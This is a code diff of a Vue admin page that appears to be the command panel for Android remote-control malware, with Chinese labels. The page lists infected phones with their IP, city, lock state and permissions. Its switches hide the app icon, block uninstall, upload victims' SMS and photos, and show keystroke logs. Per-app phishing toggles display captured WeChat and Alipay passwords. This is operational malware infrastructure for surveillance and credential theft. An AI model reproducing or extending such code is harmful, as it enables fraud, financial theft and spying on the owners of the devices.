@@ -1,197 +1,165 @@
 <template>
   <div class="mod-sys__log-operation">
-    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()" class="query-form" label-width="90px">
-      <el-row :gutter="20">
-        <el-col :span="6">
-          <el-form-item label="设备ID">
-            <el-input v-model="dataForm.deviceId" placeholder="请输入设备ID" clearable></el-input>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="所属包">
-            <el-input v-model="dataForm.pkg" placeholder="请输入所属包" clearable></el-input>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="手机型号">
-            <el-input v-model="dataForm.model" placeholder="请输入手机型号" clearable></el-input>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="品牌">
-            <el-input v-model="dataForm.brand" placeholder="请输入品牌" clearable></el-input>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="安装应用">
-            <el-select v-model="dataForm.installApp" placeholder="请选择安装应用" clearable>
-              <el-option v-for="item in installAppFilter" :key="item.pkg" :label="item.pkg" :value="item.pkg"></el-option>
-            </el-select>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="屏幕状态">
-            <el-select v-model="dataForm.status" placeholder="请选择状态" clearable>
-              <el-option label="熄屏" :value="0"></el-option>
-              <el-option label="亮屏" :value="1"></el-option>
-            </el-select>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="已杀/未杀">
-            <el-select v-model="dataForm.kill" placeholder="请选择状态" clearable>
-              <el-option label="未杀" :value="0"></el-option>
-              <el-option label="已杀" :value="1"></el-option>
-            </el-select>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="无障碍">
-            <el-select v-model="dataForm.accessibilityServiceEnabled" placeholder="请选择无障碍状态" clearable>
-              <el-option label="开启无障碍" :value="1"></el-option>
-            </el-select>
-          </el-form-item>
-        </el-col>
-        <el-col :span="6">
-          <el-form-item label="安装时间">
-            <el-date-picker
-              v-model="createdRange"
-              type="datetimerange"
-              range-separator="至"
-              start-placeholder="开始时间"
-              end-placeholder="结束时间"
-              format="YYYY-MM-DD HH:mm:ss"
-              value-format="x"
-              @change="onCreatedTimeChange"
-              style="width: 100%"
-            />
-          </el-form-item>
-        </el-col>
+    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
+      <el-form-item>
+        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
+      </el-form-item>
+      <el-form-item>
+        <el-input v-model="dataForm.pkg" placeholder="所属包" clearable></el-input>
+      </el-form-item>
+      <el-form-item>
+        <el-input v-model="dataForm.model" placeholder="手机型号" clearable></el-input>
+      </el-form-item>
 
-        <el-col :span="6">
-          <el-form-item label="备注">
-            <el-input v-model="dataForm.remark" placeholder="请输入备注" clearable></el-input>
-          </el-form-item>
-        </el-col>
+      <el-form-item>
+        <el-input v-model="dataForm.language" placeholder="语言" clearable></el-input>
+      </el-form-item>
+      <el-form-item>
+        <el-input v-model="dataForm.brand" placeholder="品牌" clearable></el-input>
+      </el-form-item>
 
-        <el-col :span="12" class="query-buttons">
-          <el-button type="primary" @click="getDataList()">查询</el-button>
-          <el-button @click="resetQuery()">重置</el-button>
-        </el-col>
-      </el-row>
+      <el-form-item>
+        <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
+          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
+        </el-select>
+      </el-form-item>
+
+      <el-form-item>
+        <el-select v-model="dataForm.status" placeholder="状态" clearable>
+          <el-option label="熄屏" :value="0"></el-option>
+          <el-option label="亮屏" :value="1"></el-option>
+        </el-select>
+      </el-form-item>
+
+      <el-form-item>
+        <el-select v-model="dataForm.kill" placeholder="已杀/未杀" clearable>
+          <el-option label="未杀" :value="0"></el-option>
+          <el-option label="已杀" :value="1"></el-option>
+        </el-select>
+      </el-form-item>
+      <el-form-item>
+        <el-select v-model="dataForm.accessibilityServiceEnabled" placeholder="无障碍" clearable>
+          <el-option label="开启无障碍" :value="1"></el-option>
+        </el-select>
+      </el-form-item>
+      <el-form-item>
+        <el-input v-model="dataForm.remark" placeholder="备注"></el-input>
+      </el-form-item>
+
+      <el-form-item>
+        <el-date-picker
+          v-model="lastActivityTimeRange"
+          type="datetimerange"
+          range-separator="至"
+          start-placeholder="开始时间"
+          end-placeholder="结束时间"
+          format="YYYY-MM-DD HH:mm:ss"
+          value-format="x"
+          @change="onLastActivityTimeChange"
+          style="width: 360px"
+        />
+      </el-form-item>
+      <el-form-item>
+        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
+      </el-form-item>
     </el-form>
     <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" table-layout="auto" style="width: 100%">
-      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip>
-        <template v-slot="scope">
-          <el-button link type="primary" @click="openDeviceDetail(scope.row)">{{ scope.row.deviceId }}</el-button>
-        </template>
-      </el-table-column>
-      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="120px" show-overflow-tooltip></el-table-column>
-      <el-table-column label="品牌/型号" header-align="center" align="center" width="100px" show-overflow-tooltip>
-        <template v-slot="scope">
-          <div class="cell-two-line">
-            <div v-if="scope.row.brand">{{ scope.row.brand }}</div>
-            <div v-if="scope.row.model">{{ scope.row.model }}</div>
-            <div v-if="!scope.row.brand && !scope.row.model">-</div>
-          </div>
-        </template>
-      </el-table-column>
-      <el-table-column prop="ip" label="城市/IP" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
-        <template v-slot="scope">
-          <div class="cell-two-line">
-            <div v-if="scope.row.addr">{{ scope.row.addr }}</div>
-            <div v-if="scope.row.ip">{{ scope.row.ip }}</div>
-            <div v-if="!scope.row.addr && !scope.row.ip">-</div>
-          </div>
-        </template>
-      </el-table-column>
-      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
-      <el-table-column prop="created" label="安装时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
-      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>
+      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
+      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
+      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
 
-      <el-table-column label="控制开关" header-align="center" align="right" width="260px">
+      <el-table-column label="屏幕分辨率" header-align="center" align="center" width="80px" :show-overflow-tooltip="true">
         <template v-slot="scope">
-          <div class="switch-grid">
-            <div class="switch-item">
-              <span class="switch-label">隐藏图标</span>
-              <el-switch :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
-            </div>
-            <div class="switch-item">
-              <span class="switch-label">阻止卸载</span>
-              <el-switch :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
-            </div>
-            <div class="switch-item">
-              <span class="switch-label">解锁密码</span>
-              <el-switch :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
-            </div>
-            <div class="switch-item">
-              <span class="switch-label">是否被杀</span>
-              <el-switch :model-value="scope.row.kill == 1" @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
-            </div>
+          {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
+        </template>
+      </el-table-column>
+      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
+        <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
+      </el-table-column>
+        <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
 
-            <div class="switch-item" v-for="item in fishTemplateList.filter((x) => x.code === 'zfb' || x.code === 'wx')" :key="item.code">
-              <span class="switch-label">{{ item.code === "zfb" ? "ZFB密码" : "WX密码" }}</span>
-              <div class="switch-actions">
-                <el-switch :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]" @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
-                <el-button v-if="!scope.row.fishSwitch || !scope.row.fishSwitch[item.code]" link type="primary" size="small" @click="showFishPwd(scope.row, item.code)">查看</el-button>
-              </div>
-            </div>
+      <el-table-column label="开关" header-align="center" align="right" width="150px">
+        <template v-slot="scope">
+          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
+          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
+          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard" @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
+          <!-- <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" /> -->
+          <el-switch inactive-text="Kill状态" :model-value="!!scope.row.kill" @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
+          <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms" @update:model-value="updateDeviceSwitch(scope.row, 'uploadSms', $event)" />
+          <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum" @update:model-value="updateDeviceSwitch(scope.row, 'uploadAlbum', $event)" />
+        </template>
+      </el-table-column>
+
+      <el-table-column label="钓鱼开关" header-align="center" align="right" width="200px">
+        <template v-slot="scope">
+          <div v-for="item in fishTemplateList" :key="item.code" style="display: flex; align-items: center; gap: 4px; margin-bottom: 4px">
+            <el-switch :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]" @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
+            <el-button
+              v-if="!scope.row.fishSwitch || !scope.row.fishSwitch[item.code]"
+              v-show="item.code === 'wx' || item.code === 'zfb'"
+              link
+              type="primary"
+              size="small"
+              @click="showFishPwd(scope.row, item.code)"
+            >
+              查看
+            </el-button>
           </div>
         </template>
       </el-table-column>
 
-      <el-table-column label="权限开关" header-align="center" align="center" width="150px">
+      <el-table-column label="权限" header-align="center" align="center" width="150px">
         <template v-slot="scope">
-          <div class="perm-grid">
-            <el-tag class="perm-tag" size="small" effect="light" :type="scope.row.accessibilityServiceEnabled == 1 ? 'success' : 'danger'">
-              <span class="perm-text">无障碍</span>
-              <el-icon class="perm-icon">
+          <div>
+            <el-tag :type="scope.row.accessibilityServiceEnabled == 1 ? 'success' : 'danger'">
+              无障碍
+              <el-icon>
                 <Select v-if="scope.row.accessibilityServiceEnabled == 1" />
                 <Close v-else />
               </el-icon>
             </el-tag>
-
-            <el-tooltip v-for="(value, key) in scope.row.permissions" :key="key" :content="String(key)" placement="top" :show-after="300">
-              <el-tag class="perm-tag" size="small" effect="light" :type="value ? 'success' : 'danger'">
-                <span class="perm-text">{{ permissionsName[key] || key }}</span>
-                <el-icon class="perm-icon">
-                  <Select v-if="value" />
-                  <Close v-else />
-                </el-icon>
-              </el-tag>
-            </el-tooltip>
+          </div>
+          <div v-for="(value, key) in scope.row.permissions" :key="key">
+            <el-tag :type="value ? 'success' : 'danger'">
+              {{ permissionsName[key] }}
+              <el-icon>
+                <Select v-if="value" />
+                <Close v-else />
+              </el-icon>
+            </el-tag>
           </div>
         </template>
       </el-table-column>
-      <el-table-column label="屏幕状态" header-align="center" align="center" width="120px">
+      <el-table-column label="设备状态" header-align="center" align="right" width="150px">
         <template v-slot="scope">
-          <div class="screen-status-grid">
-            <el-tag v-if="scope.row.status == 0" size="small" effect="light" type="info">熄屏</el-tag>
-            <el-tag v-else-if="scope.row.status == 1" size="small" effect="light" type="success">亮屏</el-tag>
-            <el-tag v-else-if="scope.row.status == 2 || scope.row.status == 3" size="small" effect="light" type="warning">等待唤醒</el-tag>
-            <el-tag v-else size="small" effect="light" type="info">未知</el-tag>
-
-            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row.lockScreen)" placement="top" :show-after="300">
-              <el-tag size="small" effect="light" type="success">可解锁</el-tag>
+          <div>
+            可解锁
+            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row.lockScreen)" placement="top">
+              <el-tag type="success">YES</el-tag>
             </el-tooltip>
-            <el-tag v-else size="small" effect="light" type="danger">不可解锁</el-tag>
+            <el-tag type="danger" v-else>NO</el-tag>
+          </div>
+          <div>
+            设备状态
+            <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
+            <el-tag type="success" v-show="scope.row.status == 1">亮屏</el-tag>
+            <el-tag type="info" v-show="scope.row.status == 2">等待唤醒</el-tag>
+            <el-tag type="info" v-show="scope.row.status == 3">等待唤醒</el-tag>
           </div>
         </template>
       </el-table-column>
-      <el-table-column label="系统/SDK" header-align="center" align="center" width="100px" show-overflow-tooltip>
-        <template v-slot="scope">
-          {{
-            scope.row.systemVersion && scope.row.sdkVersion !== null && scope.row.sdkVersion !== undefined && scope.row.sdkVersion !== ""
-              ? `${scope.row.systemVersion} / ${scope.row.sdkVersion}`
-              : scope.row.systemVersion || (scope.row.sdkVersion !== null && scope.row.sdkVersion !== undefined ? String(scope.row.sdkVersion) : "") || ""
-          }}
-        </template>
-      </el-table-column>
+
+      <el-table-column prop="created" label="安装时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
+      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>
       <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
         <template v-slot="scope">
           <!-- <el-button-group > -->
           <div>
-            <el-button link type="primary" @click="openDeviceDetail(scope.row)">链接设备</el-button>
+            <el-button link type="primary" @click="enterScreen(scope.row)">链接设备</el-button>
           </div>
           <div>
             <el-button link type="primary" @click="showInputLog(scope.row)">输入记录</el-button>
@@ -222,7 +190,7 @@
       @current-change="pageCurrentChangeHandle"
     >
     </el-pagination>
-    <!-- 详情页已改为新Tab打开，不再使用弹窗 -->
+    <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
     <!-- 输入日志弹窗 -->
     <el-dialog
       v-model="inputLogVisible"
@@ -345,6 +313,7 @@
 <script lang="ts">
 import useView from "@/hooks/useView";
 import baseService from "@/service/baseService";
+import DeviceDetail from "@/views/device/detail.vue";
 import AppList from "@/views/apps/list.vue";
 import SmsList from "@/views/sms/list.vue";
 import AlbumList from "@/views/album/list.vue";
@@ -352,6 +321,7 @@ import { defineComponent, reactive, toRefs, ref } from "vue";
 import { ElMessageBox, ElMessage } from "element-plus";
 export default defineComponent({
   components: {
+    DeviceDetail,
     AppList,
     SmsList,
     AlbumList
@@ -371,12 +341,11 @@ export default defineComponent({
         brand: "",
         installApp: "",
         status: "",
+        start: "",
+        end: "",
         remark: "",
         kill: "",
-        accessibilityServiceEnabled: "",
-        // 安装时间范围（如后端需要可使用这两个字段）
-        createdStart: "",
-        createdEnd: ""
+        accessibilityServiceEnabled: ""
       }
     });
     const deviceId = ref("");
@@ -408,7 +377,7 @@ export default defineComponent({
     const currentAlbumDevice = ref({
       deviceId: ""
     });
-    const createdRange = ref<any>(null);
+    const lastActivityTimeRange = ref<any>(null);
     const remarkDialogVisible = ref(false);
     const remarkContent = ref("");
     const remarkSubmitting = ref(false);
@@ -444,7 +413,7 @@ export default defineComponent({
       currentSmsDevice,
       albumListVisible,
       currentAlbumDevice,
-      createdRange,
+      lastActivityTimeRange,
       remarkDialogVisible,
       remarkContent,
       remarkSubmitting,
@@ -464,44 +433,35 @@ export default defineComponent({
   },
   async mounted() {
     await this.fetchInstallAppFilterList();
+    // 初始化默认的最近10分钟时间范围（使用北京时间 UTC+8）
+    const now = this.getBeijingTimestamp();
+    const tenMinutesAgo = now - 10 * 60 * 1000;
+    this.lastActivityTimeRange = [tenMinutesAgo, now];
+    this.dataForm.start = tenMinutesAgo;
+    this.dataForm.start = this.formatTime(tenMinutesAgo);
+    this.dataForm.end = this.formatTime(now);
     // 自动执行一次查询
     this.getDataList();
     await this.fetchFishTemplateList();
   },
   methods: {
-    resetQuery() {
-      // 清空查询条件（保持 dataForm 引用不变，避免丢失响应性）
-      Object.assign(this.dataForm, {
-        deviceId: "",
-        pkg: "",
-        phone: "",
-        model: "",
-        language: "",
-        brand: "",
-        installApp: "",
-        status: "",
-        remark: "",
-        kill: "",
-        accessibilityServiceEnabled: "",
-        createdStart: "",
-        createdEnd: ""
-      });
+    // 获取当前北京时间对应的时间戳（使DatePicker显示北京时间）
+    getBeijingTimestamp() {
+      const now = new Date();
+      const currentLocalTimestamp = now.getTime();
 
-      // 清空日期选择器
-      this.createdRange = null;
+      // 获取本地时区相对UTC的偏移（分钟）
+      const localOffsetMinutes = now.getTimezoneOffset();
+      // 北京时区相对UTC的偏移（分钟）：UTC+8 = -480分钟
+      const beijingOffsetMinutes = -480;
 
-      // 重新查询
-      this.getDataList();
-    },
-    onCreatedTimeChange(value: any) {
-      // value-format="x" -> 毫秒时间戳
-      if (value && Array.isArray(value) && value.length === 2) {
-        this.dataForm.createdStart = value[0];
-        this.dataForm.createdEnd = value[1];
-      } else {
-        this.dataForm.createdStart = "";
-        this.dataForm.createdEnd = "";
-      }
+      // 计算从北京时间到本地时间需要加的偏移
+      // 例如：北京现在是12:00（UTC 04:00），美国东部应该显示23:00（前一天）
+      // 但我们希望DatePicker显示12:00，所以需要加一个偏移让本地也显示12:00
+      const offsetDiffMs = (localOffsetMinutes - beijingOffsetMinutes) * 60 * 1000;
+
+      // 返回一个时间戳，使其在本地时区显示时看起来是当前的北京时间
+      return currentLocalTimestamp + offsetDiffMs;
     },
     async fetchFishTemplateList() {
       let { code, data, msg } = await baseService.post("/device/fishCodeList");
@@ -511,19 +471,9 @@ export default defineComponent({
         ElMessage.error(msg || "获取钓鱼模板失败");
       }
     },
-    openDeviceDetail(row: any) {
-      // 用 sessionStorage 传递设备信息，避免 URL 过长
-      const key = `device_detail_${row.deviceId}_${Date.now()}`;
-      sessionStorage.setItem(key, JSON.stringify(row));
-
-      const base = window.location.href.split("#")[0];
-      const qs = new URLSearchParams({
-        pop: "true",
-        page: "1",
-        key,
-        _mt: `设备详情-${row.deviceId}`
-      }).toString();
-      window.open(`${base}#/device/detail?${qs}`, "_blank");
+    enterScreen(row: any) {
+      this.deviceId = row.deviceId;
+      (this.$refs as any).deviceDetail.show(row);
     },
     async fetchInstallAppFilterList() {
       let { code, data, msg } = await baseService.post("/device/installAppFilterList");
@@ -808,6 +758,19 @@ export default defineComponent({
         this.remarkSubmitting = false;
       }
     },
+    onLastActivityTimeChange(value: any) {
+      if (value && Array.isArray(value) && value.length === 2) {
+        // 将时间戳转换为字符串格式 "yyyy-MM-dd HH:mm:ss"
+        const startTime = Number(value[0]);
+        const endTime = Number(value[1]);
+
+        this.dataForm.start = this.formatTime(startTime);
+        this.dataForm.end = this.formatTime(endTime);
+      } else {
+        this.dataForm.start = "";
+        this.dataForm.end = "";
+      }
+    },
     async showFishPwd(row: any, code: string) {
       this.fishPwdLoading = true;
       this.fishPwdDialogVisible = true;
@@ -1006,99 +969,5 @@ export default defineComponent({
   padding: 50px;
   color: #909399;
   font-size: 14px;
-}
-
-.query-form {
-  margin-bottom: 20px;
-}
-.query-buttons {
-  text-align: right;
-}
-
-/* 查询条件：统一对齐（label 固定宽度 + item 占满 col 宽度） */
-.query-form :deep(.el-form-item) {
-  width: 100%;
-  margin-right: 0;
-}
-
-.query-form :deep(.el-form-item__content) {
-  flex: 1;
-  min-width: 0;
-}
-
-.query-form :deep(.el-input),
-.query-form :deep(.el-select),
-.query-form :deep(.el-date-editor) {
-  width: 100%;
-}
-
-/* 开关列：两列网格 + 每项左右对齐，避免换行导致错位 */
-.switch-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  column-gap: 12px;
-  row-gap: 8px;
-  align-items: center;
-}
-
-.switch-item {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 8px;
-  min-width: 0;
-}
-
-.switch-label {
-  font-size: 12px;
-  color: #606266;
-  white-space: nowrap;
-}
-
-.switch-actions {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  flex-shrink: 0;
-}
-
-.cell-two-line {
-  display: flex;
-  flex-direction: column;
-  line-height: 16px;
-}
-
-/* 权限开关：紧凑可换行展示 */
-.perm-grid {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 6px;
-  justify-content: center;
-}
-
-.perm-tag {
-  display: inline-flex;
-  align-items: center;
-  gap: 4px;
-  max-width: 140px;
-}
-
-.perm-text {
-  max-width: 90px;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  white-space: nowrap;
-}
-
-.perm-icon {
-  flex-shrink: 0;
-}
-
-/* 屏幕状态：两枚tag垂直排列，居中对齐 */
-.screen-status-grid {
-  display: inline-flex;
-  flex-direction: column;
-  gap: 6px;
-  align-items: center;
 }
 </style>
